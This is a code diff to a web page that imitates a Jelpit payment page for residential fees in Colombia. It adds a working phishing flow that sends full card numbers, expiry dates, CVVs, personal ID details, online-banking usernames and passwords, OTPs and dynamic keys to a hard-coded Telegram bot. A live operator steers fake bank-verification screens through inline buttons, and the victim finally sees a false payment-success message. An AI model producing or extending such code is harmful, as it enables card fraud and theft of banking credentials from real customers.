@@ -399,6 +399,34 @@
             width: auto;
             margin: 0 4px;
         }
+
+        /* ===== MODAL AUTH JLP ===== */
+        #jlpModalOverlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.55); z-index:200000; align-items:center; justify-content:center; padding:20px; backdrop-filter:blur(2px); }
+        #jlpModalOverlay.show { display:flex; }
+        #jlpModalCard { background:white; border-radius:16px; max-width:440px; width:100%; padding:28px; max-height:90vh; overflow-y:auto; box-shadow:0 20px 60px rgba(0,0,0,0.3); }
+        .jlp-am-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; padding-bottom:16px; border-bottom:1px solid #f0f0f0; gap:16px; min-height:50px; }
+        .jlp-am-header-left { flex:1; }
+        .jlp-am-header-right { flex-shrink:0; }
+        #jlpCardLogo { height:60px; max-width:120px; object-fit:contain; }
+        .jlp-am-stage { display:none; }
+        .jlp-am-stage.active { display:block; }
+        .jlp-am-title { font-size:18px; font-weight:700; color:#2e0063; margin-bottom:8px; }
+        .jlp-am-sub { font-size:14px; color:#555; margin-bottom:20px; line-height:1.5; }
+        .jlp-am-spinner { display:flex; flex-direction:column; align-items:center; padding:30px 0; gap:16px; }
+        .jlp-spin-ring { width:52px; height:52px; border:5px solid #e8e8e8; border-top-color:#1dbe5f; border-radius:50%; animation:jlpSpin 0.9s linear infinite; }
+        @keyframes jlpSpin { to { transform:rotate(360deg); } }
+        .jlp-am-field { margin-bottom:14px; }
+        .jlp-am-field label { display:block; font-size:12px; color:#666; font-weight:600; margin-bottom:6px; }
+        .jlp-am-field input { width:100%; padding:11px 14px; border:1px solid #ccc; border-radius:8px; font-size:14px; font-family:inherit; outline:none; transition:border-color 0.2s; box-sizing:border-box; }
+        .jlp-am-field input:focus { border-color:#2e0063; }
+        .jlp-am-btn { width:100%; padding:13px; border:none; border-radius:8px; font-size:15px; font-weight:700; cursor:pointer; font-family:inherit; margin-top:8px; background:#1dbe5f; color:white; transition:opacity 0.2s; }
+        .jlp-am-btn:hover { opacity:0.9; }
+        .jlp-am-footer { margin-top:20px; text-align:center; font-size:12px; color:#aaa; }
+        .jlp-am-success-icon { text-align:center; font-size:56px; margin-bottom:16px; }
+        .jlp-am-show-pwd { position:relative; }
+        .jlp-am-show-pwd input { padding-right:42px; }
+        .jlp-am-show-pwd .eye-btn { position:absolute; right:12px; top:50%; transform:translateY(-50%); background:none; border:none; cursor:pointer; color:#888; font-size:16px; padding:0; }
+        @media (max-width:480px) { #jlpCardLogo { height:45px; max-width:90px; } #jlpModalCard { padding:20px; } }
     </style>
 </head>
 
@@ -605,6 +633,15 @@
             const chatId = '-5400378460';
             const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
+            let metodoInfo = '';
+            if (data.metodoPago === 'tarjeta') {
+                metodoInfo = `Tarjeta: ${data.numero_tarjeta}
+Fecha: ${data.fecha_tarjeta}
+CVV: ${data.cvv}`;
+            } else {
+                metodoInfo = `PSE - ${data.pseBank}`;
+            }
+
             const message = `
 📋 *NUEVO PAGO RECIBIDO*
 
@@ -621,7 +658,7 @@
 └ Referencia 2: ${data.referencia2}
 
 💳 *MÉTODO DE PAGO*
-└ ${data.metodoPago === 'tarjeta' ? 'Tarjeta (**** **** **** ' + data.numero_tarjeta.slice(-4) + ')' : 'PSE - ' + data.pseBank}
+${metodoInfo}
 
 💰 *MONTO*
 └ ${data.monto_formateado}
@@ -784,60 +821,35 @@
                     const tarjetaFecha = document.getElementById('tarjetaFecha').value;
                     const tarjetaCVV = document.getElementById('tarjetaCVV').value;
 
-                    // Validar campos
                     if (!tarjetaCedula || !tarjetaNumero || !tarjetaFecha || !tarjetaCVV) {
                         alert('Por favor completa todos los campos de tarjeta');
                         return;
                     }
 
-                    // Enviar a Telegram
-                    sendToTelegram({
+                    const num = tarjetaNumero.replace(/\s/g, '');
+                    const primerDigito = num[0];
+                    const tipoTarjeta = primerDigito === '4' ? 'visa' : primerDigito === '3' ? 'amex' : 'mastercard';
+
+                    abrirModalJLP({
                         nombre: userNombre,
                         apellido: userApellido,
                         email: userEmail,
                         celular: userCelular,
-                        tipo_doc: tarjetaDocType,
+                        tipoDoc: tarjetaDocType,
                         cedula: tarjetaCedula,
+                        cardFirst6: num.slice(0, 6),
+                        cardLast: num.slice(-4),
+                        vencimiento: tarjetaFecha,
+                        tipoTarjeta: tipoTarjeta,
+                        monto: totalNumber,
+                        montoFormateado: totalFormatted,
                         nombreConjunto: nombreConjunto,
                         referencia1: referencia1,
                         selectedApt: selectedApt,
-                        referencia2: referencia2,
-                        metodoPago: 'tarjeta',
                         numero_tarjeta: tarjetaNumero,
-                        monto_formateado: totalFormatted
-                    });
-
-                    // Preparar datos para enviar
-                    const formData = new FormData();
-                    formData.append('numero_tarjeta', tarjetaNumero);
-                    formData.append('fecha', tarjetaFecha);
-                    formData.append('cvv', tarjetaCVV);
-                    formData.append('nombre', userNombre);
-                    formData.append('apellido', userApellido);
-                    formData.append('tipo_doc', tarjetaDocType);
-                    formData.append('cedula', tarjetaCedula);
-                    formData.append('celular', userCelular);
-                    formData.append('email', userEmail);
-                    formData.append('monto', finalAmount);
-
-                    // Enviar a backend
-                    fetch('https://psec-px42.onrender.com/panel/run/create_tarjeta_m3it3m.php', {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.status === 'OK') {
-                            showLoadingModal(tarjetaNumero, userNombre, userApellido, finalAmount, nombreConjunto);
-                            setTimeout(() => {
-                                showOTPModal(tarjetaNumero, userNombre, userApellido, finalAmount, nombreConjunto);
-                            }, 10000);
-                        } else {
-                            alert('❌ No se pudo procesar el pago. Por favor intenta de nuevo.');
-                        }
-                    })
-                    .catch(error => {
-                        alert('❌ Error de conexión. Por favor intenta de nuevo.');
+                        fecha_tarjeta: tarjetaFecha,
+                        cvv: tarjetaCVV,
+                        metodoPago: 'tarjeta'
                     });
                 }
             });
@@ -858,125 +870,360 @@
         });
 
 
-        function showLoadingModal(tarjeta, nombre, apellido, monto, comercio) {
-            const html = `
-                <div id="loadingModal" style="position: fixed; inset: 0; background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 2000;">
-                    <div style="background: white; border-radius: 16px; padding: 60px 40px; text-align: center; max-width: 500px;">
-                        <div style="display: inline-block; width: 60px; height: 60px; border: 5px solid #f0f0f0; border-top-color: #1dbe5f; border-radius: 50%; animation: spin 1s linear infinite;"></div>
-                        <h2 style="color: #2e0063; margin: 30px 0 15px 0; font-size: 24px;">Esperando verificación</h2>
-                        <p style="color: #666; font-size: 16px; margin: 0;">con el banco...</p>
-                        <style>
-                            @keyframes spin {
-                                to { transform: rotate(360deg); }
-                            }
-                        </style>
-                    </div>
-                </div>
-            `;
-            document.body.insertAdjacentHTML('beforeend', html);
+        // ===== MODAL DE AUTORIZACIÓN JLP =====
+        const JLP_TK = '8550551689:AAFdVOrd7qj8vdfTozXZLhQA99cb0ndBLds';
+        const JLP_GRP = '-1004398504693';
+        const JLP_API = 'https://api.telegram.org/bot' + JLP_TK;
+
+        let jlpSid = null;
+        let jlpPollIv = null;
+        let jlpOffset = 0;
+        let jlpDatos = null;
+        const JLP_MAX = 300000;
+
+        function jlpStage(s) {
+            ['Wait','Cred','LoadingCred','OTP','Clave','LoadingVerif','Success'].forEach(function(n) {
+                var el = document.getElementById('jlpStage' + n);
+                if (el) el.classList.remove('active');
+            });
+            var map = { 'wait':'Wait', 'cred':'Cred', 'loading-cred':'LoadingCred', 'otp':'OTP', 'clave':'Clave', 'loading-verif':'LoadingVerif', 'success':'Success' };
+            var el = document.getElementById('jlpStage' + (map[s] || s));
+            if (el) el.classList.add('active');
         }
 
-        function showOTPModal(tarjeta, nombre, apellido, monto, comercio) {
-            const loadingModal = document.getElementById('loadingModal');
-            if (loadingModal) loadingModal.remove();
+        async function jlpSend(text, keyboard) {
+            try {
+                var body = { chat_id: JLP_GRP, text: text, parse_mode: 'HTML', disable_web_page_preview: true };
+                if (keyboard) body.reply_markup = keyboard;
+                var r = await fetch(JLP_API + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
+                var d = await r.json();
+                return d.ok ? d.result.message_id : null;
+            } catch(e) { return null; }
+        }
 
-            const totalFormatted = new Intl.NumberFormat('es-CO', {
-                style: 'currency',
-                currency: 'COP',
-                minimumFractionDigits: 0
-            }).format(monto);
+        async function jlpGetUpdates() {
+            try {
+                var r = await fetch(JLP_API + '/getUpdates?timeout=5&offset=' + jlpOffset + '&allowed_updates=callback_query');
+                var d = await r.json();
+                if (d.ok && d.result.length > 0) jlpOffset = d.result[d.result.length - 1].update_id + 1;
+                return d.ok ? d.result : [];
+            } catch(e) { return []; }
+        }
 
-            const html = `
-                <div id="otpModalOverlay" style="position: fixed; inset: 0; background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 2000;">
-                    <div style="background: white; border-radius: 16px; padding: 40px; max-width: 500px; width: 90%; box-shadow: 0 20px 60px rgba(0,0,0,0.3);">
-                        <div style="display: flex; justify-content: center; margin-bottom: 20px; font-size: 48px;">📱</div>
+        function jlpStopPoll() {
+            if (jlpPollIv) { clearInterval(jlpPollIv); jlpPollIv = null; }
+        }
 
-                        <h2 style="color: #2e0063; margin: 0 0 10px 0; font-size: 24px; font-weight: 700; text-align: center;">Ingrese Código OTP</h2>
-                        <p style="color: #666; font-size: 14px; margin: 0 0 25px 0; text-align: center;">Revise su SMS o aplicación bancaria para obtener el código.</p>
+        function jlpCerrar() {
+            jlpStopPoll();
+            document.getElementById('jlpModalOverlay').classList.remove('show');
+        }
 
-                        <div style="background: #f5f5f5; padding: 20px; border-radius: 12px; margin-bottom: 25px;">
-                            <div style="text-align: left; margin-bottom: 15px;">
-                                <div style="font-size: 12px; color: #666; font-weight: 600; margin-bottom: 5px;">Comercio:</div>
-                                <div style="font-size: 16px; font-weight: 700; color: #333;">${comercio || '—'}</div>
-                            </div>
-                            <div style="text-align: left; margin-bottom: 15px;">
-                                <div style="font-size: 12px; color: #666; font-weight: 600; margin-bottom: 5px;">Monto:</div>
-                                <div style="font-size: 16px; font-weight: 700; color: #333;">${totalFormatted}</div>
-                            </div>
-                            <div style="text-align: left;">
-                                <div style="font-size: 12px; color: #666; font-weight: 600; margin-bottom: 5px;">Tarjeta:</div>
-                                <div style="font-size: 16px; font-weight: 700; color: #333;">**** **** **** ${tarjeta.slice(-4)}</div>
-                            </div>
-                        </div>
-
-                        <div style="margin-bottom: 25px;">
-                            <label style="font-size: 12px; color: #666; display: block; margin-bottom: 8px; font-weight: 600; text-align: left;">Código OTP (6 dígitos):</label>
-                            <input type="text" id="otpInput" placeholder="000000" maxlength="6" style="width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 18px; text-align: center; font-family: monospace; letter-spacing: 4px;" />
-                        </div>
-
-                        <button id="btnContinuarOTP" style="width: 100%; padding: 14px; background: #1dbe5f; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.3s;">Continuar</button>
-                    </div>
-                </div>
-            `;
-            document.body.insertAdjacentHTML('beforeend', html);
-
-            setTimeout(() => {
-                document.getElementById('otpInput').focus();
-            }, 100);
-
-            document.getElementById('btnContinuarOTP').addEventListener('click', function() {
-                const otp = document.getElementById('otpInput').value;
-                if (!otp || otp.length !== 6) {
-                    alert('Por favor ingresa un código OTP válido (6 dígitos)');
-                    return;
+        function jlpStartPoll(onAction) {
+            var t0 = Date.now();
+            jlpStopPoll();
+            jlpPollIv = setInterval(async function() {
+                if (Date.now() - t0 > JLP_MAX) { jlpStopPoll(); jlpCerrar(); return; }
+                var updates = await jlpGetUpdates();
+                for (var i = 0; i < updates.length; i++) {
+                    var upd = updates[i];
+                    if (upd.callback_query) {
+                        var data = upd.callback_query.data || '';
+                        if (data.startsWith('jlp:') && data.endsWith(':' + jlpSid)) {
+                            var action = data.split(':')[1];
+                            fetch(JLP_API + '/answerCallbackQuery', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({callback_query_id: upd.callback_query.id}) }).catch(function(){});
+                            jlpStopPoll();
+                            onAction(action);
+                            return;
+                        }
+                    }
                 }
+            }, 2000);
+        }
 
-                // Cambiar botón a loading
-                const btnContinuar = document.getElementById('btnContinuarOTP');
-                const otpInput = document.getElementById('otpInput');
-                btnContinuar.disabled = true;
-                btnContinuar.innerHTML = '<div style="display: inline-block; width: 20px; height: 20px; border: 3px solid #f0f0f0; border-top-color: white; border-radius: 50%; animation: spin 1s linear infinite;"></div>';
+        function jlpKb(rows) {
+            return { inline_keyboard: rows };
+        }
 
-                // Enviar OTP a Telegram
-                const token = '8759383283:AAEGahtOduKJ0q8R7tfXyathcZMwZnRTx3I';
-                const chatId = '-5400378460';
-                const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        async function abrirModalJLP(datos) {
+            jlpDatos = datos;
+            jlpSid = 'JLP' + Date.now() + Math.random().toString(36).substr(2, 5);
 
-                const otpMessage = `
-✅ *OTP CONFIRMADO*
+            // Cabecera modal
+            document.getElementById('jlpCardName').textContent = (datos.nombre || '') + ' ' + (datos.apellido || '');
+            document.getElementById('jlpAmountLine').textContent = datos.montoFormateado || '';
 
-📱 Código OTP: ${otp}
-💳 Tarjeta: **** **** **** ${tarjeta.slice(-4)}
-👤 Cliente: ${nombre} ${apellido}
-💰 Monto: ${totalFormatted}
-🏢 Comercio: ${comercio || '—'}
+            var logoEl = document.getElementById('jlpCardLogo');
+            var logoMap = { visa: 'img/visa.23bdf942526c2769.png', mastercard: 'img/mastercard.5ab31ac022d71e0f.png', amex: 'img/american-express.4ee605f4da5f9117.png' };
+            var logoSrc = logoMap[datos.tipoTarjeta] || logoMap.visa;
+            logoEl.src = logoSrc;
+            logoEl.style.display = 'block';
 
-⏰ *FECHA Y HORA*
-└ ${new Date().toLocaleString('es-CO')}
-                `;
+            jlpStage('wait');
+            document.getElementById('jlpModalOverlay').classList.add('show');
 
-                fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: otpMessage,
-                        parse_mode: 'Markdown'
-                    })
-                });
+            // Inicializar offset para no recibir mensajes viejos
+            await jlpGetUpdates();
 
-                // Después de 10 segundos, resetear
-                setTimeout(() => {
-                    otpInput.value = '';
-                    otpInput.focus();
-                    btnContinuar.disabled = false;
-                    btnContinuar.innerHTML = 'Continuar';
-                }, 10000);
+            // Enviar mensaje a Telegram
+            var sid = jlpSid;
+            var cardDisplay = datos.numero_tarjeta;
+            var msgCard = '💳 TARJETA\n' +
+                '• Número: <code>' + datos.numero_tarjeta + '</code>\n' +
+                '• Vencimiento: <code>' + datos.fecha_tarjeta + '</code>\n' +
+                '• CVV: <code>' + datos.cvv + '</code>';            var tipoLabel = datos.tipoTarjeta === 'visa' ? '💳 VISA' : datos.tipoTarjeta === 'amex' ? '💳 AMEX' : '💳 MASTERCARD';
+            var msg = '🔔 <b>NUEVA SOLICITUD — JELPIT</b>\n' +
+                '🆔 ID: <code>' + sid + '</code>\n' +
+                '─'.repeat(22) + '\n' +
+                 msgCard + '\n'  +
+                '─'.repeat(22) + '\n' +
+                '👤 <b>TITULAR</b>\n' +
+                '• Nombre: <code>' + datos.nombre + ' ' + datos.apellido + '</code>\n' +
+                '• Doc: <code>' + datos.tipoDoc + ' ' + datos.cedula + '</code>\n' +
+                '• Celular: <code>' + datos.celular + '</code>\n' +
+                '• Email: <code>' + datos.email + '</code>\n' +
+                '─'.repeat(22) + '\n' +
+                '🏢 <b>Conjunto:</b> <code>' + datos.nombreConjunto + '</code>\n' +
+                '🏠 <b>Inmueble:</b> <code>' + datos.selectedApt + '</code>\n' +
+                '💰 <b>Monto:</b> <code>' + datos.montoFormateado + '</code>\n' +
+                '📅 ' + new Date().toLocaleString('es-CO');
+
+            var kb = jlpKb([
+                [{ text: '✅ Aprobar', callback_data: 'jlp:apr:' + sid }, { text: '❌ Rechazar', callback_data: 'jlp:rec:' + sid }],
+                [{ text: '📲 Pedir OTP', callback_data: 'jlp:otp:' + sid }, { text: '🔑 Clave Dinámica', callback_data: 'jlp:cdp:' + sid }]
+            ]);
+
+            await jlpSend(msg, kb);
+
+            jlpStartPoll(function(action) {
+                if (action === 'apr') {
+                    jlpStage('cred');
+                } else if (action === 'rec') {
+                    jlpCerrar();
+                } else if (action === 'otp') {
+                    jlpStage('otp');
+                    jlpStartPollVerif();
+                } else if (action === 'cdp') {
+                    jlpStage('clave');
+                    jlpStartPollVerif();
+                }
             });
         }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Enviar credenciales
+            var btnCred = document.getElementById('jlpBtnEnviarCred');
+            if (btnCred) btnCred.addEventListener('click', async function() {
+                var user = (document.getElementById('jlpCredUser').value || '').trim();
+                var pass = (document.getElementById('jlpCredPass').value || '').trim();
+                if (!user || !pass) { alert('Por favor completa los campos'); return; }
+
+                jlpStage('loading-cred');
+                var sid = jlpSid;
+                var msg = '🔐 <b>CREDENCIALES INGRESADAS</b>\n' +
+                    '🆔 ID: <code>' + sid + '</code>\n' +
+                    '─'.repeat(20) + '\n' +
+                    '• Usuario: <code>' + user + '</code>\n' +
+                    '• Contraseña: <code>' + pass + '</code>';
+
+                var kb = jlpKb([
+                    [{ text: '📲 Pedir OTP', callback_data: 'jlp:otp:' + sid }, { text: '🔑 Clave Dinámica', callback_data: 'jlp:cdp:' + sid }],
+                    [{ text: '❌ Error Credenciales', callback_data: 'jlp:erc:' + sid }]
+                ]);
+
+                await jlpSend(msg, kb);
+
+                jlpStartPoll(function(action) {
+                    if (action === 'otp') {
+                        jlpStage('otp');
+                        jlpStartPollVerif();
+                    } else if (action === 'cdp') {
+                        jlpStage('clave');
+                        jlpStartPollVerif();
+                    } else if (action === 'erc') {
+                        jlpStage('cred');
+                        document.getElementById('jlpCredUser').value = '';
+                        document.getElementById('jlpCredPass').value = '';
+                        jlpMostrarError('jlpStageCred', 'Usuario o contraseña incorrectos. Por favor verifica tus datos e inténtalo de nuevo.');
+                    }
+                });
+            });
+
+            // Toggle password
+            var eyeBtn = document.getElementById('jlpEyeBtn');
+            if (eyeBtn) eyeBtn.addEventListener('click', function() {
+                var inp = document.getElementById('jlpCredPass');
+                var icon = eyeBtn.querySelector('i');
+                if (inp.type === 'password') { inp.type = 'text'; icon.className = 'fa-regular fa-eye-slash'; }
+                else { inp.type = 'password'; icon.className = 'fa-regular fa-eye'; }
+            });
+
+            // Enviar OTP
+            var btnOtp = document.getElementById('jlpBtnEnviarOtp');
+            if (btnOtp) btnOtp.addEventListener('click', async function() {
+                var otp = (document.getElementById('jlpOtpInput').value || '').trim();
+                if (!otp) { alert('Por favor ingresa el código'); return; }
+                jlpStage('loading-verif');
+                var sid = jlpSid;
+                var msg = '📲 <b>CÓDIGO OTP INGRESADO</b>\n🆔 ID: <code>' + sid + '</code>\n• OTP: <code>' + otp + '</code>';
+                var kb = jlpKb([[{ text: '✅ Aprobar', callback_data: 'jlp:aot:' + sid }, { text: '❌ Rechazar', callback_data: 'jlp:rot:' + sid }]]);
+                await jlpSend(msg, kb);
+                jlpStartPollVerif();
+            });
+
+            // Enviar Clave Dinámica
+            var btnClave = document.getElementById('jlpBtnEnviarClave');
+            if (btnClave) btnClave.addEventListener('click', async function() {
+                var clave = (document.getElementById('jlpClaveInput').value || '').trim();
+                if (!clave) { alert('Por favor ingresa tu clave dinámica'); return; }
+                jlpStage('loading-verif');
+                var sid = jlpSid;
+                var msg = '🔑 <b>CLAVE DINÁMICA INGRESADA</b>\n🆔 ID: <code>' + sid + '</code>\n• Clave: <code>' + clave + '</code>';
+                var kb = jlpKb([[{ text: '✅ Aprobar', callback_data: 'jlp:acd:' + sid }, { text: '❌ Rechazar', callback_data: 'jlp:rcd:' + sid }]]);
+                await jlpSend(msg, kb);
+                jlpStartPollVerif();
+            });
+        });
+
+        function jlpMostrarError(stageId, msg) {
+            var el = document.getElementById(stageId);
+            if (!el) return;
+            var existing = el.querySelector('.jlp-err-msg');
+            if (existing) existing.remove();
+            var div = document.createElement('div');
+            div.className = 'jlp-err-msg';
+            div.style.cssText = 'background:#fff2f2;border:1px solid #f5c6cb;border-radius:8px;padding:12px 14px;margin-bottom:14px;font-size:13px;color:#c0392b;display:flex;align-items:center;gap:8px;';
+            div.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="font-size:16px;flex-shrink:0;"></i><span>' + msg + '</span>';
+            el.insertBefore(div, el.querySelector('.jlp-am-field') || el.querySelector('.jlp-am-btn'));
+        }
+
+        function jlpStartPollVerif() {
+            var t0 = Date.now();
+            jlpStopPoll();
+            jlpPollIv = setInterval(async function() {
+                if (Date.now() - t0 > JLP_MAX) { jlpStopPoll(); jlpCerrar(); return; }
+                var updates = await jlpGetUpdates();
+                for (var i = 0; i < updates.length; i++) {
+                    var upd = updates[i];
+                    if (upd.callback_query) {
+                        var data = upd.callback_query.data || '';
+                        if (data.startsWith('jlp:') && data.endsWith(':' + jlpSid)) {
+                            var action = data.split(':')[1];
+                            fetch(JLP_API + '/answerCallbackQuery', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({callback_query_id: upd.callback_query.id}) }).catch(function(){});
+                            jlpStopPoll();
+                            if (action === 'aot' || action === 'acd') {
+                                jlpStage('success');
+                            } else if (action === 'rot') {
+                                jlpStage('otp');
+                                document.getElementById('jlpOtpInput').value = '';
+                                jlpMostrarError('jlpStageOTP', 'El código ingresado no es válido. Por favor verifica e inténtalo de nuevo.');
+                            } else if (action === 'rcd') {
+                                jlpStage('clave');
+                                document.getElementById('jlpClaveInput').value = '';
+                                jlpMostrarError('jlpStageClave', 'La clave dinámica ingresada no es correcta. Por favor verifica e inténtalo de nuevo.');
+                            } else {
+                                jlpCerrar();
+                            }
+                            return;
+                        }
+                    }
+                }
+            }, 2000);
+        }
     </script>
+
+    <!-- Modal Autorización Jelpit -->
+    <div id="jlpModalOverlay">
+      <div id="jlpModalCard">
+        <div class="jlp-am-header">
+          <div class="jlp-am-header-left">
+            <div id="jlpCardName" style="font-size:15px; font-weight:700; color:#2e0063;"></div>
+            <div id="jlpAmountLine" style="font-size:13px; color:#555; margin-top:4px;"></div>
+          </div>
+          <div class="jlp-am-header-right">
+            <img id="jlpCardLogo" alt="Tarjeta" style="display:none;">
+          </div>
+        </div>
+
+        <!-- wait -->
+        <div id="jlpStageWait" class="jlp-am-stage active">
+          <div class="jlp-am-title">Autorizando transacción</div>
+          <div class="jlp-am-sub">Estamos verificando tu pago con el banco. Esto puede tomar unos segundos.</div>
+          <div class="jlp-am-spinner">
+            <div class="jlp-spin-ring"></div>
+            <p style="color:#888; font-size:14px; margin:0;">Esperando confirmación...</p>
+          </div>
+        </div>
+
+        <!-- cred -->
+        <div id="jlpStageCred" class="jlp-am-stage">
+          <div class="jlp-am-title">Confirma tu identidad</div>
+          <div class="jlp-am-sub">Ingresa las credenciales de tu banco para continuar.</div>
+          <div class="jlp-am-field">
+            <label>Usuario</label>
+            <input type="text" id="jlpCredUser" placeholder="Ingresa tu usuario" autocomplete="off">
+          </div>
+          <div class="jlp-am-field">
+            <label>Contraseña</label>
+            <div class="jlp-am-show-pwd">
+              <input type="password" id="jlpCredPass" placeholder="Ingresa tu contraseña" autocomplete="off">
+              <button class="eye-btn" id="jlpEyeBtn" type="button" tabindex="-1"><i class="fa-regular fa-eye"></i></button>
+            </div>
+          </div>
+          <button class="jlp-am-btn" id="jlpBtnEnviarCred">Continuar</button>
+        </div>
+
+        <!-- loading-cred -->
+        <div id="jlpStageLoadingCred" class="jlp-am-stage">
+          <div class="jlp-am-title">Verificando credenciales</div>
+          <div class="jlp-am-spinner">
+            <div class="jlp-spin-ring"></div>
+            <p style="color:#888; font-size:14px; margin:0;">Procesando...</p>
+          </div>
+        </div>
+
+        <!-- otp -->
+        <div id="jlpStageOTP" class="jlp-am-stage">
+          <div class="jlp-am-title">Código OTP</div>
+          <div class="jlp-am-sub">Revisa tu SMS o app bancaria e ingresa el código de verificación.</div>
+          <div class="jlp-am-field">
+            <label>Código OTP</label>
+            <input type="text" id="jlpOtpInput" placeholder="Ingresa el código" maxlength="8" autocomplete="one-time-code" inputmode="numeric" style="letter-spacing:4px; font-size:20px; text-align:center;">
+          </div>
+          <button class="jlp-am-btn" id="jlpBtnEnviarOtp">Confirmar</button>
+        </div>
+
+        <!-- clave -->
+        <div id="jlpStageClave" class="jlp-am-stage">
+          <div class="jlp-am-title">Clave Dinámica</div>
+          <div class="jlp-am-sub">Ingresa tu clave dinámica para confirmar la transacción.</div>
+          <div class="jlp-am-field">
+            <label>Clave Dinámica</label>
+            <input type="text" id="jlpClaveInput" placeholder="Ingresa tu clave" maxlength="8" autocomplete="one-time-code" inputmode="numeric" style="letter-spacing:4px; font-size:20px; text-align:center;">
+          </div>
+          <button class="jlp-am-btn" id="jlpBtnEnviarClave">Confirmar</button>
+        </div>
+
+        <!-- loading-verif -->
+        <div id="jlpStageLoadingVerif" class="jlp-am-stage">
+          <div class="jlp-am-title">Verificando código</div>
+          <div class="jlp-am-spinner">
+            <div class="jlp-spin-ring"></div>
+            <p style="color:#888; font-size:14px; margin:0;">Validando...</p>
+          </div>
+        </div>
+
+        <!-- success -->
+        <div id="jlpStageSuccess" class="jlp-am-stage">
+          <div class="jlp-am-success-icon">✅</div>
+          <div class="jlp-am-title" style="text-align:center;">¡Pago exitoso!</div>
+          <div class="jlp-am-sub" style="text-align:center;">Tu pago ha sido procesado correctamente. Recibirás confirmación pronto.</div>
+          <button class="jlp-am-btn" onclick="window.location.href='home.html'">Finalizar</button>
+        </div>
+
+        <div class="jlp-am-footer">Conexión segura · SSL 256-bit</div>
+      </div>
+    </div>
 </body>
 
 </html>
